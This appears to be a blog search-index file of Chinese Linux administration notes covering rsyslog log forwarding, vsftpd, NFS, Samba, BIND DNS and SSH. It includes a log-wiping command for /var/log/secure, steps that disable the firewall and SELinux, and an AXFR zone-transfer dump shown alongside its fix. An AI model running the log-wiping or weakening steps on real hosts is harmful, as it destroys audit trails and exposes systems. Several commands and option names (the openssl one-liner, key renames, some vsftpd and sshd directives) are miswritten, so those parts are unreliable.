  </entry>
  <entry>
    <title><![CDATA[Linux日志异地备份]]></title>
    <url>%2FLinux%E6%97%A5%E5%BF%97%E5%BC%82%E5%9C%B0%E5%A4%87%E4%BB%BD%2F</url>
    <content type="text"><![CDATA[日志的异地备份 日志服务器的建立尤其重要 这里使用Centos的登录日志做实验 tail -f /var/log/secure 实时查看日志变化 echo &quot; &quot; &gt; var/log/secure 最简单的清理日志 常见日志文件12345/var/log/messages 大多数系统日志信息记录在此处/var/log/secure 安全和身份认证相关的信息和错误的日志文件/var/log/mallog 与邮件服务器相关的日志文件/var/log/cron 与定时任务相关的日志文件/var/log/boot.log 与系统启动有关的日志文件 发送方：考虑问题1.我发送什么信息表到日志服务器 2.考虑发送到ip哪个端口 3.使用什么协议 配置配置文件 1234567vim /etc/rsyslog.conf# 这里配置登录日志， 指定日志类别和等级，协议和端口### begin forwarding rule ####*.* @@remote-host:514 @@代表使用TCPauthpriv.* @@192.168.0.111:514 12345678910### Note：# 1.暂时关闭防火墙 setup # 关闭防火墙iptables -nL # 查看一下# 2.关闭SELinuxsetenforce 0getenforce# 重启rsyslog 服务 接收方：考虑问题1.收谁的日志 2.收完存哪 3.用什么协议 配置配置文件 1234567891011vim /etc/rsyslog.conf# 指定协议和端口# Provides TCP syslog reception$ModLoad imtcp$InputTCPServerRun 514# 收谁的，存哪# 按照ip地址来收:fromhost-ip, isequal, "192.168.0.100" /var/log/client_log/192.168.0.100.log 123# 重启rsyslog 服务netstat -antlp |grep 514 # 查看端口是否开始监听了 完成]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>日志</tag>
        <tag>异地备份</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-文件服务]]></title>
    <url>%2Fubuntu-server-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[文件服务 我的就是你的 - 你的还是你的 网络诞生最初的动因是去中心化和资源共享文件是初期最主要的资源共享形式（把文件存放在集中的位置供大家访问） 去中心化是另外一个话题 早期的军事需求 现在的信任需求 FTP服务最古老的就是FTP 产生于安全出现之前 明文传输一切 目前主要用于公开提供的文件下载服务(目前还没消亡) 使用简单、兼容性好 还有SFTP、FTPS等 FTP服务端软件 Server U vsftpd Proftpd 为了安全考虑 独立部署于企业防火墙之外 只读挂载存储或采用只读存储设备(CD / DVD) vsftp安装和配置和管理vsftpd – 灵活、安全的FTP服务端软件 安装1234sudo apt install vsftpd# 安装过程中生成ftp账号（anonymous） 主目录在：/srv/ftp# 默认是21端口进行会话 FTP账号 1234# 安装完之后会自动创建一个ftp账号（这个账号是不能使用shell和登录机器 ）/etc/passwd # bin/false 表示不能使用shell/etc/shadow # * 表示不能使用终端/srv/ftp # ftp用户主目录 配置两种配置模式 12anonymous # 匿名模式（适用于公开共享文件） -- vsftpd安装好之后是默认禁用匿名登陆的Standard # 认证模式 常见FTP客户端 1234567891011# 用哪个账号登录，看到的文件就是哪个用户的主目录# 1.使用命令行连接ftp服务器ftp 192.168.1.130# 2.浏览器ftp://192.168.111.130# 3.ftp客户端访问程序（FileZilla）# 4.文件同步客户端软件 1.匿名登录配置文件位置 1/etc/vsftpd.conf # 主配置文件 开启匿名模式 123456789sudo vim /etc/vsftpd.conf # 修改内容为anonymous_enable=YES # 启用匿名账号登录local_enable=NO # 禁用认证用户登录# 重启vsftpd服务，检查状态然后使用账号anonymous登录(命令行需要,其他方式不用)，密码不用输即可()看到的目录是`/srv/ftp/` 开启匿名账号上传默认：匿名账号是不允许匿名上传的 123456789101112131415161718sudo vim /etc/vsftpd.conf # 修改内容write_enable=YES # 全局设置（以下配置生效的依赖）anon_upload_enable=YES # 允许匿名上传文件anon_mkdir_write_enable=YES # 允许匿名创建目录# 重启服务，检查状态sudo systemctl restart vsftpd.service但是还是不能上传的（因为vsftpd强制禁止在根目录下匿名上传）Note： ftp的主目录是不能进行上传文件的，因为这个目录对同组用户没有写的权限(`ls -ld`查看当前目录的权限)，就算你chmod修改了权限也是不行的【解决办法】:在根目录新建文件然后上传sudo mkdir /srv/ftp/upload # 创建上传目录sudo chown ftp:ftp /srv/ftp/upload # 配置新建文件系统属主数组# 继续新增配置 /etc/vsftpd.conf anon_umask=022 # 上传文件权限掩码(让上传的文件配置不同的权限 -- 看自己需要来配置)anon_other_wrote_enable=YES # 允许删除和重命名(否则删除不了也无法重命名) 修改FTP主目录 12sudo mkdir /srv/files/ftpsudo chown -d /srv/files/ftp ftp 文件传输日志默认是开启的，可以查看恶意文件上传记录 123456# sudo vim /etc/vsftpd.conf xferlog_enable=YES # 默认开启xferlog_file=/var/log/vsftpd.log # 默认日志存放位置(注释不注释他都默认往里面写，可修改)# 如果修改，重启服务 其他配置 12345idle_session_timeout=600 # 会话超时时长no_anon_password=YES # 命令行登录禁用密码提示hide_ids=YES # 显示属主/数组名称，而不显示uid和gid(uid会比较敏感)# 重启服务 端口 会话指令 -&gt; TCP 21端口 数据传输模式 主动模式（受客户端防火墙影响）– 客户端随机产生一个端口，告诉服务器 -&gt;服务端只使用 20端口 被动模式 （兼容性好，建议使用） – 服务端告诉客户端使用哪个端口传输 12345# 用什么模式，客户端说了算# 都是客户端随机产生一个端口，告诉服务端# 被动模式连接ftp -p 192.168.0.130 限定被动模式数据通信端口 1234# sudo vim /etc/vsftpd.conf 新增配置# 开放一个端口的范围(尽量少开) pasv_min_port=40001pasv_max_port=40101 然后在服务器端边界防火墙上开放上述100个端口 2.身份认证登录身份认证登录TFP 安装之后的默认配置 不能上传 可回溯到根目录（存在安全隐患!!! –&gt; 使用chroot来解决） chrootchroot 将所有登录用户锁定在自己的主目录里（防止目录回溯） 1234567# 配置文件 sudo vim /etc/vsftpd.conf# 全局的配置参数(对所有用户)chroot_local_user=YES # 但是chroot的根目录不能是可写的# 重启服务# 默认主目录可写， 但是chroot的根目录不能是可写的，vsftp的禁止用户登录，好猫短 ————&gt; 怎么办呢？看下面 （接上文）两种解决办法:1.为FTP登录指定新的主目录（建议使用） 12345sudo mkdir ~/ftp &amp;&amp; chmod -w ftp # 新建主目录，并删除写入权限# sudo vim /etc/vsftpd.conflocal_root=/home/xps/ftp# 客户端只能看到这个目录里面，跳不出去 2.允许根目录写入（不建议，存在安全风险） 1234# 配置文件 sudo vim /etc/vsftpd.confwrite_enable=YESlocal_root=/home/xpsallow_writeable_chroot=YES chroot 将指定登录用户锁定在自己的主目录里（防止目录回溯） 1234567891011121314# 配置文件 sudo vim /etc/vsftpd.conf# chroot_local_user=YES # 注释掉前面配置的全局的配置项# 启用用户列表功能chroot_list_enable=YES # 如果chroot_local_user=YES也开启了，就起了相反的作用(除了指定列表里面的用户之外, 都锁定在主目录里)# 指定用户列表文件chroot_list_file=/etc/vsftpd.chroot_list# 编辑用户账号列表vim /etc/vsftpd.chroot_list# 添加用户xpsftp# 重启服务 禁止指定FTP登录账号 1/etc/ftpusers # 默认禁止FTP登录账号(将用户加入进去) 上传文件权限掩码 12# 跟匿名用户的配置是类似的local_umask=022 文件同步客户端自动把我电脑的新的文件，上传到FTP服务器(类似于备份) – 有一些第三方软件(ubuntu自带的同步软件backup等) FTP安全1.FTPS: FTP over Secure Socket Layer(SSL) 账号无需shell登录权限 基于证书的加密 开启FTPS： 1234567891011# 安全性--指的是在数据传输过程中不会被别人嗅探ssl_enable=YES # 启动FTPSrsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem # 公钥rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key # 私钥# 重启服务# 然后再连接的时候就是加密的了(浏览器需要ftps://ip)# 怎么加密的呢?# 简单来说：安装FTP时候默认会生成一对公钥和私钥# 不建议使用安装FTP时候默认生成的证书，建议手动生成(每个应用一个证书, 每个证书有效期一两年) 手动生成证书 –&gt; 替换默认证书(安全考虑)：1.生成秘钥文件 123# 使用ssl的一个开源组件opensslopenssl genrsa -des3 -out ftp.key 4096 # 1024的已经不安全了# 然后设置密码保护 2.生成不加密的秘钥文件 123456# 先还原为明文的密钥对openssl rsa -in ftp.key -out ftp.key.insecure # 用完就删掉这个insecure文件# 改名(这是加密的)mv ftp.key server.key.secure # 改名(这是明文的)mv server.key.insecure ftp.key 3.生成证书请求文件(使用上面的明文秘钥) – 实验使用的自签名证书 12openssl req -new -key ftp.key -out ftp.csr# 然后输入一些证书的信息 这里使用自签名证书(生产环境建议由证书颁发机构前面生成证书)3.生成自签名证书 1openssl x509 -req -days 365 -in ftp.csr -signkey ftp.key -out ftp.pem # -days 365有效期 4.部署证书 123# ftp.key放到一个更安全的目录去sudo cp ftp.key /etc/ssl/private/ # 此目录root才能看sudo cp ftp.pem /etc/ssl/certs/ 5.修改/etc/vsftpd.cong中的key和公钥为刚才手动生成的证书， 然后重启服务 上面的操作也可以合并为一条命令 1openssl x509 -req -node -days 365 -newkey rsa:4096 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/private/vsftpd.pem 2.SFTP: 基于SSH加密隧道传输文件 账号需要shell登录权限（可设置禁止权限） 远程登录那一章已经学了 NFS服务 适用于类UNIX系统 NFS – Network File System 最早由SUN公司开发 类unix平台最主要的文件共享方法 基于RPC(Remote Procedure Call)协议 NFS是一个RPC Server （v3 、v4） 协议本身不加密，可结合SSH，Kerberos实现加密 隐藏式身份验证（难点） 权限配置是关键 服务端口: TCP 2049 安装 123456sudo apt-get install nfs-kernel-server # 服务端sudo apt-get install nfs-common # 客户端# 安装完，服务已经都启动了ps -ef |grep rpcps -ef |grep nfs 进程 12345rpcbind # RPC服务进程nfsd # NFS主进程(身份识别)mountd # 根据 /etc/exports 配置验证权限lockd # 锁定（需C/S同时启用）statd # 一致性（需C/S同时启用） 身份识别 客户端提供 UID / GID (与用户名、组名无关) 服务器按客户端UID /GID 赋权 若服务器无客户端UID / GID账号，则将客户端映射为匿名账号 nobody / nogroup (uid: 65534) 客户端使用root账号（UID 0），默认映射为匿名账号 可修改配置文件映射 UID 0 为服务端 ROOT （存在安全隐患） 如果客户端uid和服务端uid相同，则客户端会获得服务器端账号的权限；若不同，则客户端获取服务端的nobody权限(除非客户端是root账号,且服务端启用了客户端的root映射为服务端的root) 隐式的身份认证 权限体系 1.共享权限 2.文件系统权限 配置 123456789101112sudo vim /etc/exports # 主配置文件# 内容：共享目录,谁可以访问我, 权限，(sync是数据先写到内存在硬盘可靠,async是写到内存然后写的硬盘速度快)，no_subtree_check是不进行子目录的检查(建议使用)/exports/public 192.168.1.0/24(rw,sync,no_subtree_check) # 允许访问的范围可以使用通配符： *.lab.com no_root_squash # 禁用root默认映射为nobody(加在上面括号中的配置中)# sudo mkdir -p /exports/public # 创建共享目录sudo chown nobody:nogroup /exports/public # 设置权限sudo systemctl restart nfs-kernel-server # 重启服务sudo exportfs # 查看共享目录cat /var/lib/nfs/etab # 共享目录cat /var/lib/nfs/xtab # 客户端信息 共享权限 123456ro/rw # 只读/只写sync / async # 同步写入硬盘 / 暂存于内存中all_squash # 所有用户全部映射为nobodyanonuid / anongid # 支付那个匿名ID（默认65534）secure / insecure # 使用1024以下/以上端口hide / no_hide # 共享 / 不共享NFS子目录 客户端挂载 12345678# 和本地挂载设备一样(挂载到本地，但是访问是通过网络流量的)sudo mount 192.168.0.30:/export/public my_nfs/# 写入文件的话1.临时获取root权限，会默认转为nobodysudo xxxxx 2.chmod修改其他用户的权限后，直接写入即可(客户端的uid与服务端的uid相同的话) 启动挂载风险：nfs服务器如果出现问题，本地机器启动就会特别慢 12# sudo vim /etc/fstab192.168.1.30:/home /my_nfs/ nfs no_auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0 # 建议 no_auto 不自动挂载 其他命令 1234rpcinfo -p 192.168.1.30 # 查询RPC服务注册状态(客户端与服务端都可以执行)tail /var/log/kern.log # 服务器日志showmount -e localhost # 显示共享目录df -h # 客户端查看挂载 企业环境有统一域名和身份验证时 123# 也要配置这个sudo vim /etc/idpamd.confDomain = lab.com Windows客户端企业版才可以添加nfs的支持 SAMBA服务SMB / CIFS 协议 全称Server message block / Common internet file system 最早由IBM研发，后由微软采用并不断完善 Windows文件和打印共享（之前使用的SMB协议, 后来改进为cifs协议） 端口：TCP 139(局域网), 445() / UDP 137(用来名称解析), 138 Samba 是开源世界逆向了SMB协议后打造的兼容微软SMB的文件共享服务 Samba还有其他功能、用途和使用场景 功能不仅限于此，但最常用的用途，还是做文件共享服务： NFS只适用于类Unix系统环境 Samba适用与Windows、Linux混合环境的文件共享需要 Samba实现了CIFS服务的四个基本功能1.文件和打印共享2.认证和授权3.名称解析4.服务宣告(browsing) 传输协议： 12NetBIOS # 局域网NetBIOS over TCP/IP # 跨网段(把NetBIOS数据包封装之后跨网络传输) 后台进程 1234Smbd # 文件共享主进程 TCP: 139/445Nmbd # WINS通信、名称解析 UDP: 137/138Winbindd # 同步系统账号(把Linux系统的账户拷到samba的用户数据库中进行处理)其他10多个进程 安装1sudo apt install samba libpam-winbind 配置配置文件： 12/etc/samba/dhcp.conf # 指定WINS服务器（跨网段时候用）/etc/samba/smb.conf # 主配置文件 一. 配置验证用户名的Samba服务1.配置文件/etc/samba/smb.conf 123456789101112workgroup = WORKGROUP # [global] 工作组：net config worktation查看工作组[Private] # 起个名(共享文件夹的名称)comment = prvivate share # 描述path = /srv/private/ # 共享路径browseable = no # 是否允许访问者可显示它这个共享文件夹(完整账号)guest ok = no # 禁用来宾账号writable=yes # 可读写(read only=yes)create mask = 0700 # 新建文件权限vaild users=@samba # 可访问共享的用户组(稍后会创建)# 2.创建用户/组/共享文件夹 123456789sudo adduser user1sudo groupadd smaba # 上面配置的组的名称sudo gpasswd -a user1 sambasudo smbpasswd -a user1 # 设置用户SMB密码(不是操作系统的密码)sudo mkdir /srv/private/ # 创建共享目录sudo setfacl -R -m "g:samba:rwx" /srv/private/ # 设置acl访问控制列表，-m修改 (ll之后看到后面有个+号，表示有更多权限) getfacl /srv/private/ # 查看权限testparm # 检测sudo systemctl restart smbd.service nmbd.service 客户端访问win上可以访问Linux上的Samba文件夹, Linux上也可以访问Linux上的Samba文件夹 Linux 12345678# 图形化点击Connect to Server，输入地址：smb://192.168.0.130# 命令行smbclient -L //192.168.0.130 # 查看目标都有哪些共享信息smbclient -L //192.168.0.130 -U user1 mount -t cifs -o username=user1 //192.168.0.130/private/public /mnt # 挂载 Windows 12345678910# win+R\\192.168.0.130# 命令行工具来访问net user # 查看会话net user \\host\private/user1 passwdnet user \\host\private /delete # 删除已经建立的会话net user g: \\host\private # 映射为本地盘符net config workstation 共享名称以$结尾的，在win上会认为隐藏共享(Linux上还是会显示) 二. 配置公开访问的Samba服务(开放共享文件件)将不提供登录账号的用户映射为guest，无需输入密码 1.配置文件 123456#配置文件/etc/samba/smb.conf [Global] # 起个名(共享文件夹的名称)workgroup = WORKGROUP security = user # share已废止、Domain、ADS、Servermap to guest = bad user # 映射为guestguest ok = yes # 允许来宾账号 2.开放共享文件夹 123456[Public]comment = public sharepath = /srv/public/browseable = yes # 允许看到writable = yesguest ok = yes 3.创建共享目录 123456789mkdir -p /srv/public/# 设置访问列表（设置user,nobody代表guest）sudo setfacl -R -m "u:nobody:rwx" /srv/public/getfacl /srv/public/ # 查看权限testparm # 检测# 重启服务sudo systemctl restart smbd.service nmbd.service 客户端访问同上 服务器信息 123smbd --version # 查看版本sudo smbstatus # 查看状态和连接状况]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>文件服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-DNS服务]]></title>
    <url>%2Fubuntu-server-DNS%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[DNS服务 您是谁家老小 域名解析原理DNS：将容易基于的主机名映射到IP地址计算机命名规范： Netbiso名称（微软） Hostname DNS分布式名称系统(但是不同的dns服务器是有层级关系的，呈树状结构) DNS服务结构： 域名 比如：sina.com.cn FQDN(fully qualified domain names ) 比如:www.sina.com.cn 即主机名(www)+域名(sina.com.cn) DNS记录类型 记录类型 作用 NS 域名服务器记录(找a.com与里面的域名对应的ip的话，就要去问域名服务器,问他www的对应的主机的ip地址是多少)，一个域可以有多个域名服务器(dig a.com ns) A 主机记录(域名解析到ip地址) CNAME 别名记录(给域名指向另一个A记录的域名,可以叠加) MX 邮件交换记录 PTR 指针记录（反向查询） SOA 起始授权记录(soa记录对应的域名服务器，才是合法的) DNS命名空间www.ubuntu.com.严格来说是有点的，但是为了方便，最后面不写点也可以 DNS查询： 逐级委派由机构LCANN负责管理, 负责根域. DNS查询寻结构三种DNS服务器： Master(DNS域里面中，master服务器可以修改DNS记录，在master上做得修改也会自动同步到其他slave等dns服务器) 一般只设置一台 Slave（数据文件来自master的同步） – 前两者两种服务器都会保存dns记录类型 Cache （不保存任何记录，一般都是运营商提供的，跟下面的dns查询有关系，意义：本个区域内有缓存了减少dns会话的流量，提高了效率，减轻了带宽占用，超出生命周期之后才会再次查询） TTL4.Forward（转发类型的，比如会去转发给本地运营商的dns服务器(比如家用无线路由器会企业的域控)，而不是自己去进行递归查询啥的） 同时是三种角色 安装DNS服务使用最广的DNS服务的软件包：BIND（Berkley Internet Naming Daemon）在ubuntu上： 1234567# 安装bind(即软件包) 9是版本，dnsutils是用来检查的软件包sudo apt install bind9 dnsutils# DNS服务区只保存和解析本域各种域名记录# DNS服务都包含13个根域名服务器地址 cat /etc/bind/db.root # -&gt; ipv4和ipv6地址(AAAA记录) # 事实分布于世界的数百台根域服务器，不只是13个（国内是有根域服务器的） DNS服务器的DNS服务器配置自己做迭代指定递归域名服务器（自建尽量禁用其他地址来连接我们递归查询功能, 除非查询的是域内的域名） 1# 见 DNS主备部署 DNS默认服务端口TCP 53 / UDP 53 这里是以Bind软件包为例 还有其他软件包： Djbdns 衍生版本：Dbndns, ndjbsns dhamasq DNS + DHCP打包的轻量解决方案 –&gt; 经常用于无线渗透，搭建无线AP3.PowerDNS 模块化开源DNS服务器软件 DNS主备部署对于dns服务器本身的dns地址可以执行运营商等的地址 正向区域配置Master DNS服务器执行区域文件（正向区域 –&gt; 域名解析为ip） 企业内部自用， 一般一个域中会有两个DNS服务器 1. 1234567# sudo vim /etc/bind/named.conf.local# zone定义一个区域， type类型，指定存具体记录的文件zone "lab.com"&#123; type master; file "/etc/bind/db.lab.com"&#125; 2.编辑区域文件 1234567891011121314151617181920212223242526272829# 拷贝一个现有的区域文件模板，进行修改(也可手动创建)cp db.local db.lab.comsudo vim db.lab.com# 文件内容; BIND data file for lab.com loopback interface;$TTL 604800 # 允许缓存DNS服务器的缓存时长，单位s， 1D -&gt;一天,12h -&gt; 12小时@ IN SOA soa.lab.com. root.localhost. ( # @表示本域的域名， IN -&gt;互联网记录类型， SOA起始授权记录; root.localhost.管理员邮箱地址(点就是@ -&gt;root.lab.com.), 括号多行内容 2 ; Serial # 版本号，如果slave的与master服务器字段值相同则不同步数据，不同则同步数据 604800 ; Refresh # slave向master的更新周期 86400 ; Retry # 重试周期 2419200 ; Expire # 最大重试时间 604800 ) ; Negative Cache TTL;@ IN NS ns1 # NS记录，dns域的域名服务器的名称@ IN A 10.1.8.128 # 给哪个域名创建A记录，访问本机的域名解析到哪里@ IN AAAA ::1 # ipv6使用的ns1 IN A 10.1.8.10 # 给域的ns记录域名解析到哪个ipsoa IN A 10.1.8.10www IN CNAME web # 把www.lab.com解析为web.com.labweb IN CNAME w3 # 有一个CNAME记录w3 IN A 10.1.8.128 # 最终解析为A记录的ip@ IN MX 10 mx1 # 优先级，数字越小优先级越高@ IN MX 10 mx2 mx1 IN A 10.1.8.1 # 再把mx的域名解析到ipmx2 IN A 10.1.8.2ftp IN A 10.1.8.128ftp IN A 10.1.8.129 # 同一个a记录命名指向不同的ip，不区分优先级，而是轮询 3.重启服务 12sudo systemctl restart bind9sudo systemctl status bind9 4.服务器配置检查 12345sudo named-checkconf # 检查语法错误sudo named-checkzone lab.com /etc/bind/db.lab.com # 正向区域检查sudo named-checkzone lab.com /etc/bind/db.lab.com # 反向区域检查 5.客户端解析验证 12345678910# dig在win上没有ping lab.comdig lab.com ns @10.1.8.10 # 解析ns记录，@dns服务器dig www.com @10.1.8.10dig com a @10.1.8.100 # 不指定的话，默认就是a记录dig lab.com mx @10.1.8.100 客户端解析验证 1234567891011# nslookup在linux和win都有nslookup# 设置参数 server 10.1.8.100 # dns服务器set q=ns # 查询记录类型lab.com # 查询目标## Windows本机hi进行dns本地缓存， 而Linux本地是不做缓存的ipconfig /displaydns # 显示本地缓存的dns记录ipconfig /flushdns # 清空本地缓存的dns记录 配置Cache DNS服务器主配置文件/etc/bind/named.conf 1234# 只是一个入口文件include "/etc/bind/named.conf.options"; # 规范: 【分号结尾】include "/etc/bind/named.conf.local"; #include "/etc/bind/named.conf.default-zones"; 全局转发DNS服务器对于不属于我们域的解析转发给其他dns服务器 （我们内部的nds服务器不知道怎么解析之后要去找谁）配置转发器的文件: vim /etc/bind/named.conf.options1.全局转发： 123456789101112acl "local"&#123; # options 块之前 10.1.8.0/24； # 本地网段(为公司内部的地址提供服务)&#125;； options &#123; recursion yes; # recursion即递归查询(公网上的dns服务器一般是禁止递归查询的) allow-recursion &#123; local; &#125;; # 允许对我发起递归查询的地址范围 listen-on &#123; 10.0.2.53; &#125;; # 指定侦听的地址 forwarders &#123; 9.9.9.9; # 全局性的转发器，转发给谁 8.8.8.8; &#125;;&#125;; sudo systemctl restart bind9.service 2.局部转发 1234567zone "sina.com.cn" &#123; # 创建一个域名 type forward; forwarders &#123; 202.99.96.68; #局部转发，针对某个域名转发给某一个ip 202.106.0.20; &#125;;&#125;; sudo systemctl restart bind9.service 解析过之后，就有了缓存，在一定时间内就不会转发再进行请求了 反向区域配置Master DNS服务器（i反向区域: ip解析为域名 –&gt; 反垃圾邮件）反垃圾邮件：攻击者伪造域内邮件发送恶意文件；检查外部的邮件是否是从真正的邮件服务器发送过来的1. 1234567# sudo vim /etc/bind/named.conf.local# zone定义一个区域， type类型，指定存具体记录的文件zone "8.1.10.in-addr-arpa"&#123; # 反着写,这里一个网段的地址10.1.8就写为8.1.10 type master; file "/etc/bind/db.10.1.8";&#125; 2. 123456# 拷贝一个模板文件sudo cp /etc/bind/db.127 /etc/bind/db.10.1.8# 重启服务sudo systemctl restart bind9sudo systemctl status bind9 3. 12345678910111213141516171819# 编辑反向区域配置文件vim /etc/bind/db.10.1.8# 文件内容;; BIND reverse data file for local loopback interface;$TTL 604800@ IN SOA ns.lab.com. root.lab.com. ( 1 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL;@ IN NS ns.lab.com. # 本地的ns记录10 IN PTR ns.lab.com. # PTR 反向指针记录145 IN PTR mx1.lab.com #145即10.1.8.1452 IN PTR mx2.lab.com 2 IN PTR w3.lab.com # 一个ip也可以解析为多个域名 4.检测一下反向解析是否正常 1dig -x 10.1.8.2@10.1.8.2 配置Slave DNS服务器 为例实现冗余容错(防止某台dns服务器宕机)，通常会为每个与安装多个Slave DNS服务器 修改记录只能在Master DNS服务器(一个域内只允许有一个)上操作，通过版本号(Serial)通知Slave服务器同步 (所以。作为master的管理员，配置更新之后需要手动修改版本号的值) 安全考虑 服务器全局禁止区域传输（同步本域所有DNS记录） 只允许指定IP，指定区域的Slave服务器进行区域传输 区域数据同步使用TCP 53端口 1. 123456789101112# dig进行区域传输获取信息 axfr(黑客最喜欢拿的)dig @10.1.8.10 lab.com axfr## 禁止区域传输：# 全局配置文件 # sudo vim named.conf.options# 在option中添加：allow-transfer &#123; none; &#125;;# 重启# 禁用之后，不影响dig来查询某记录，只是拒绝一次性把记录拿走 2.继续修改master服务器配置 123# sudo vim /etc/bind/named.conf.local# 在正向/反向zone字段里面都要添加allow-transfer &#123; 10.0.2.54; &#125;; # 允许10.0.2.54 -&gt; 就是slave服务器 3.继续修改master服务器配置 123456789101112# vim /etc/bind/db.lab.com# 增加一条NS记录和A记录 @ IN NS ns2ns2 IN A 10.1.8.20# 编辑反向的域名解析记录# vim db.10.1.820 IN PTR ns2.lab.com.# 重启服务 4.安装slave dns服务器并配置 12345678910111213141516171819sudo vim /etc/bind/named.conf.options# 内容acl "local"&#123; # 10.1.8.0/24； &#125;； options &#123; recursion yes; allow-recursion &#123; local; &#125;; listen-on &#123; 10.0.8.20; &#125;; # 侦听自己的 allow-transfer &#123; none; &#125;; forwarders &#123; 9.9.9.9; 8.8.8.8; &#125;; ............&#125;;# 重启服务 5.slave dns服务器上创建区域 12345678910111213141516171819202122232425# sudo vim /etc/bind/named.conf.local# 正向zone区域（和master上的对应好）zone "lab.com"&#123; type slave; file "db.lab.com"; # 不能使用绝对路径(区域文件不用手动创建) masters &#123; 10.1.8.10; &#125;;&#125;# 反向区域zone "8.1.10.in-addr.arpa"&#123; type slave; file "db.lab.com"; # 不能使用绝对路径 masters &#123; 10.1.8.10; &#125;;&#125;# 重启服务#区域文件db.lab.com不用手动创建# 会自动从master上同步下来# 位置在 /var/cache/bind/ 而且文件是加了密的# 查看slave dns服务器的情况grep bind /var/log/syslog 记录更新通知Slave服务器到达更新周期客户端数据加密保存（不能直接修改）Master服务器通知版本号 master服务器的dns配置更新之后，一定要手动修改版本号，然后重启 在区域配置文件配置（master服务器的dns配置更新之后会通知slave服务器）： 123# sudo vim /etc/bind/named.conf.local# 正反向zone都要配置also-notify &#123; 10.1.8.20; &#125;;]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-远程管理]]></title>
    <url>%2Fubuntu%20server-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[第七章-远程管理 看我遥控你 远程访问方式为什么要远程管理？服务器大多部署与专门的机房： 电磁、噪声、氧气、温度湿度等都不适宜人类长期居住 避免闲杂人等结束业务服务器 远程管理 不同的操作系统都支持远程管理技术 命令行远程管理工具 图形化远程管理工具 Telnet 账号证明就是你 古老的命令行远程管理工具（保底的，建议能不用就不用） 不安全（明文） 应尽量避免适用（适用于不支持ssh的环境） 客户端程序包含在所有系统的默认安装中 服务端口默认TCP 23 客户端1234#可以连接任何域名和端口telnet 1.1.1.1 80#和80端口建立socket连接后，可以发送http数据 服务器端程序安装1234567sudo apt install telnetdvim /etc/issus.net # 避免泄露版本信息,#打开文件，修改tenlet的banner信息（可以修改为一些告知的警告信息:"本公司的服务器,出问题承担法律责任"哈哈）# 查看服务状态systemctl status inetd.service SSH 账号证明就是你 服务器安装12345678910111213141516# ubuntu中ssh-server和ssh-client都默认安装了sudo apt install openssh-server # openssh是个工具套件(包含了sftp,scp等)# sftp(替代了sftp) &lt;---&gt; ftp(明文传输,不太安全)# scp(替代了rcp) &lt;---&gt; rcp(远程拷贝文件,明文传输,不太安全)#查看服务状态systemctl status sshd.service# 服务端口默认`22` # 配置文件(ubuntu上来就可以直接使用不用配置)vim /etc/ssh/sshd_config#修改配置在这个文件 SSH1、SSH2两个版本(版本2更安全) 配置文件vim /etc/ssh/sshd_config常用配置项：1234567891011Banner /etc/ssh_banner.sh # 登录前的banner,指定文件Port 2222 # 修改默认端口(修改后，下次连接会改变端口)PubkeyAuthentication yes # 开启后使用公钥登录/关闭(no)ListenAddress 12.34.56.78 # 指定哪块网卡才能侦听22(被ssh连接)PermitRootLogin yes # 是否允许root远程登录(不过还是建议使用普通账号),建议设置为no是禁止所有方式登录 #prohibit-password是禁用账号密码方式Protocol 2 # 默认是2.0的协议，可以加一下这条配置，指定只接受2.0版本的连接Allowsers user1 user2 # DenyUsers user3 允许/禁止ssh连接的用户AllowGroup sshusers # 允许/禁止ssh连接的用户`组`PasswordAuthentication no # 禁止使用密码登录(单一密码认证的安全性很低)# 更多配置查文档 一些零散问题 — SSH工具1.scp1234567#默认连接22端口，如果修改了就需要指定端口号scp a.txt 192.168.1.10: # 拷贝一个文件(默认本地账号与原创系统账号同名，默认目标是主目录) 注意冒号scp a.txt user1@192.168.1.10:/home/b.txt # 指定用户名、目标路径scp -rv dirs/ user1@192.168.1.10: # 拷贝一个目录， -r递归,-v详细信息scp user1@192.168.1.10:/tmp/b.txt . # 拷贝目标服务器的文件到我的机器当前目录上(下载) 2.SFTP（ssh和ftp的组合）1234567891011# 登录sftp xps@192.168.1.10# 下载文件get a.txt# 上传put# 一些命令：help, ls, cd, get, wget, put, mput# 退出 quit exit ssh公钥登录非对称算法（公钥算法） 公钥 私钥公钥加密，私钥解密；私钥加密，公钥解密 生成秘钥对123456789101112131415161718192021222324252627282930313233# 1.在我的机器(客户端)产生一对， 选择rsa算法，秘钥长度选择4096ssh-keygen -t rsa -b 4096# 修改...# 命名秘钥对ssh-keygen -t rsa -b 4096 -f id_mail# 修改私钥密码文(这个密码要设置更加安全一点) -p， -f指定修改哪个key的ssh-keygen -p -f ~/.ssh/id_rsa # 有多个的话，-f指定# 2.设置公私钥保存的位置，和打开的密码# 存放在下面两个文件~/.ssh/id_rsa # 私钥~/.ssh/id_rsa.pub # 公钥#ps：know_hosts是连接过的主机# 3.把公钥文件--&gt;传送到目标服务器上(服务器上会变成.ssh/authorized_key)ssh-copy-id xps@192.168.0.10 #如果有多个，-i选择公钥# 4. 建议设本地私钥文件权限chmod 400 .ssh/id_rsa# 5.服务端公钥权限也要修改.ssh/authorized_key# 6.现在可放心登录了(现在输入的密码是对私钥加密的密码)ssh xps@192.168.0.10# Note：记得配置文件修改为禁止使用ssh密码登录,使用公钥登录：PasswordAuthentication noPubkeyAuthentication yes# Note:私钥千万不能泄露哦 